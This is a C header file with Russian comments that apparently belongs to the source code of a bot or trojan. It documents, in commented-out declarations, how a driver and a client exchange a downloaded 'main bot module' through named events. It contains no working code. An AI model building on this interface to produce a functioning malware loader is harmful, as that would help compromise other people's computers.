//--------------------------------------------------------------------------------
//  Заголовочный модуль библиотеки загрузки бота
//--------------------------------------------------------------------------------


#ifndef LoaderDllH
#define LoaderDllH

//--------------------------------------------------------------------------------


#include <windows.h>


//*****************************************************************
//  TDownloadModuleRec - Структура данных загрузки основного 
//						 модуля бота
//*****************************************************************
/*
typedef struct TDownloadModuleRec
{
	PWCHAR DriverEvent;  // Имя события которое создаст клиент для уведомления драйвера об окончании загрузки
	PWCHAR ClientEvent;  // Имя события которое создаст драйвер для уведомления клиента о том, что он закончил работу с данными
	LPVOID *Module;      // Указатель на переменную куда клиент запишет указатель на данные загруженного модуля
	DWORD *ModuleSize;   // Указатель на переменную куда клиент запишет размер модуля
} *PDownloadModuleRec;

*/
//*****************************************************************
//  Start - Функция стартует загрузку основного модуля бота
//          Декларация функции связана с требованием драйвера
//
//  DownloadRec - Указатель на структуру TDownloadModuleRec
//
//  Функция инициирует загрузку модуля и возвращает управление
//  Код вызывающий функцию после её вызова должен дождаться
//  сигнального состояния события DriverEvent. После обработки
//  загруженных данных вызывающий код должен установить в
//  сигнальное состояние событие ClientEvent
//
//  В случае успеха клиент заполнит поля Module и ModuleSize
//  соответствующими значениями. В противном случае эти поля 
//  будут заполнены нулевыми значениями
//
//*****************************************************************

//extern"C" VOID NTAPI Start(PVOID Recerved, PVOID DownloadRec, PVOID Recerved2);


//--------------------------------------------------------------------------------
#endif

